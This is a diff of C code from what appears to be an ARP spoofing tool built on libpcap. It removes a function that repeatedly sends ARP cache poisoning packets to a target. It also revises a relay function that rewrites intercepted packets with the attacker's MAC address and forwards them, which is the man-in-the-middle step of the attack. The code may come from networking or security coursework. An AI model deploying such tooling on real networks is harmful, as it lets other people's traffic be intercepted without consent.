@@ -163,56 +163,20 @@ void get_mac_from_ip(uint8_t* dst_mac, const char* ip)
     }
 }
 
-void send_infection_packet(pcap_t* handle, const uint8_t* packet, arp_packet* arp_lists,
-                           addr_pair* address_table, int session_size)
-{
-    uint8_t target_mac[MAC_SIZE] = {0, };
-
-    get_target_mac_from_arp_table(target_mac, packet, address_table, session_size);
-    if( !strlen((char*)target_mac) ) return;  // continue if the sender was not in our table
-
-
-
-    int i = get_session_location(target_mac, address_table, session_size);
-    for(int cnt = 0; cnt < 3; cnt++) // send packet three times
-    {
-        sleep(1);   // make term before we send arp packet
-        if( pcap_sendpacket(handle, (const uint8_t*)&arp_lists[i], sizeof(arp_packet)) ) {
-            printf("broadcast arp packet sending failed\n");
-            return;
-        }
-    }
-}
-
 void send_relay_packet(pcap_t* handle, const uint8_t* packet, addr_pair* address_table, int session_size, int packet_size)
 {
-    uint8_t target_mac[MAC_SIZE] = {0, }, my_mac[MAC_SIZE] = {0, };
-    GetSvrMACAddress(my_mac);
-    get_target_mac_from_arp_table(target_mac, packet, address_table, session_size);
-
+    uint8_t target_mac[MAC_SIZE] = {0, };   get_target_mac_from_arp_table(target_mac, packet, address_table, session_size);
+    uint8_t my_mac[MAC_SIZE] = {0, };       GetSvrMACAddress(my_mac);
     uint8_t empty_mac[MAC_SIZE] = {0, };
+
     if( !memcmp(target_mac, empty_mac, MAC_SIZE) ) return;  // return if that target mac was not in arp table
 
-    printf("%.2X %.2X %.2X %.2X %.2X %.2X\n", target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]);
-
     set_relay_packet(packet, target_mac, my_mac);
-    if( pcap_sendpacket(handle, packet, packet_size))
+    if( pcap_sendpacket(handle, packet, packet_size) )
     {
         printf("relay packet sending failed\n");
         return;
     }
+
+    printf("IP packet(%dsize) relayed\n", packet_size);
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
